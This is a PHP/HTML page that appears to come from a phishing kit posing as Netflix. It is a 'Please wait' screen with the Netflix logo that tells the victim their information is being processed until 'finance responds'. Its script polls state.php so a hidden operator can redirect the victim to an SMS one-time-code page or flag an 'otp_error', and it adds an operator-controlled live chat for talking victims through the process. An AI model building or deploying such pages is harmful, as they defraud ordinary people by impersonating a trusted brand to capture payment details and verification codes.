<?php
require 'main.php';

$next = isset($_GET['next']) ? trim($_GET['next']) : 'sms.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/netflixc.css">
    <title>Netflix</title>
    <style>
        .wait-wrapper {
            max-width: 500px;
            margin: 60px auto;
            background: #111;
            padding: 24px;
            border-radius: 8px;
            border: 1px solid #1f1f1f;
            color: #f5f5f5;
        }

        .status-text {
            text-align: center;
            margin-bottom: 12px;
        }

        .chat-panel {
            margin-top: 20px;
            display: none;
        }

        .chat-panel.active {
            display: block;
        }

        .chat-box {
            background: #0f0f0f;
            border: 1px solid #2a2a2a;
            border-radius: 6px;
            padding: 12px;
            max-height: 240px;
            overflow-y: auto;
            margin-top: 8px;
        }

        .chat-message {
            margin-bottom: 10px;
            padding: 8px;
            border-radius: 6px;
        }

        .chat-message.admin { background: #17212b; border: 1px solid #2c3e50; }
        .chat-message.user { background: #1b2a18; border: 1px solid #2e7d32; }

        .chat-meta {
            font-size: 12px;
            color: #9e9e9e;
        }

        .chat-controls {
            display: flex;
            gap: 8px;
            margin-top: 10px;
        }

        .chat-controls input {
            flex: 1;
            padding: 10px;
            border-radius: 6px;
            border: 1px solid #333;
            background: #111;
            color: #f5f5f5;
        }

        .chat-controls button {
            padding: 10px 14px;
            border: none;
            border-radius: 6px;
            background: #e50914;
            color: #fff;
            cursor: pointer;
        }

        .chat-controls button:hover { background: #b20710; }
    </style>
</head>
<body>
<header>
   <div class="logo">
           <img src="res/img/Logo.png" alt="Netflix logo">  </div>
       </header>

<main>
    <div class="form">
        <div class="continer wait-wrapper">
            <div class="titles_holder" style="padding:10px;">
                <h2>Please wait...</h2>
            </div>
            <div class="heads">
                <p class="status-text">Processing your information. We will move you forward as soon as finance responds.</p>
                <div class="loding"><img src="res/img/loadings.gif" style="width:60px;" alt="Loading"></div>
            </div>

            <div class="chat-panel" id="chat-panel">
                <h3>Live chat</h3>
                <div class="chat-box" id="chat-box"></div>
                <div class="chat-controls">
                    <input type="text" id="chat-input" placeholder="Type a message...">
                    <button type="button" id="chat-send">Send</button>
                </div>
                <p class="chat-meta">Chat appears only when the admin enables it.</p>
            </div>
        </div>
    </div>
</main>

<script>
    const nextUrl = <?php echo json_encode($next); ?>;
    const chatPanel = document.getElementById('chat-panel');
    const chatBox = document.getElementById('chat-box');
    const chatInput = document.getElementById('chat-input');
    const chatSend = document.getElementById('chat-send');
    let lastInstructionToken = sessionStorage.getItem('instruction_token') || 0;
    let chatReady = false;

    function addOrUpdateParam(url, key, value) {
        const parsed = new URL(url, window.location.href);
        parsed.searchParams.set(key, value);
        return parsed.toString();
    }

    function renderChat(messages) {
        if (!chatBox) return;
        chatBox.innerHTML = '';

        if (!messages.length) {
            chatBox.innerHTML = '<div class="chat-meta">No messages yet.</div>';
            return;
        }

        messages.forEach((entry) => {
            const row = document.createElement('div');
            row.className = `chat-message ${entry.sender}`;
            row.innerHTML = `
                <div>${entry.message.replace(/\n/g, '<br>')}</div>
                <div class="chat-meta">${entry.sender.charAt(0).toUpperCase() + entry.sender.slice(1)} • ${entry.formatted}</div>
            `;
            chatBox.appendChild(row);
        });

        chatBox.scrollTop = chatBox.scrollHeight;
    }

    async function fetchChat() {
        try {
            const response = await fetch('chat_api.php?action=fetch');
            const data = await response.json();
            if (data.chat_enabled) {
                chatPanel.classList.add('active');
                chatInput.disabled = false;
                chatSend.disabled = false;
                renderChat(data.messages || []);
            } else {
                chatPanel.classList.remove('active');
                chatInput.disabled = true;
                chatSend.disabled = true;
            }
        } catch (e) {
            console.error('Unable to load chat.', e);
        }
    }

    async function sendChatMessage() {
        if (!chatInput.value.trim()) return;
        const message = chatInput.value.trim();
        chatInput.value = '';
        try {
            await fetch('chat_api.php?action=send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ sender: 'user', message })
            });
            fetchChat();
        } catch (e) {
            console.error('Unable to send chat message', e);
        }
    }

    async function pollState() {
        try {
            const response = await fetch('state.php');
            const state = await response.json();

            if (state.chat_enabled && !chatReady) {
                chatReady = true;
                chatPanel.classList.add('active');
                fetchChat();
                setInterval(fetchChat, 3000);
            } else if (!state.chat_enabled) {
                chatPanel.classList.remove('active');
                chatReady = false;
            }

            if (state.instruction !== 'stay_wait' && state.instruction_token != lastInstructionToken) {
                lastInstructionToken = state.instruction_token;
                sessionStorage.setItem('instruction_token', lastInstructionToken);
                let target = nextUrl || 'sms.php';
                if (state.instruction === 'otp_error') {
                    target = addOrUpdateParam(target, 'otp_error', '1');
                }
                window.location = target;
            }
        } catch (e) {
            console.error('Unable to poll state', e);
        }
    }

    if (chatSend) {
        chatSend.addEventListener('click', sendChatMessage);
        chatInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendChatMessage();
            }
        });
    }

    pollState();
    setInterval(pollState, 3000);
</script>
</body>
</html>
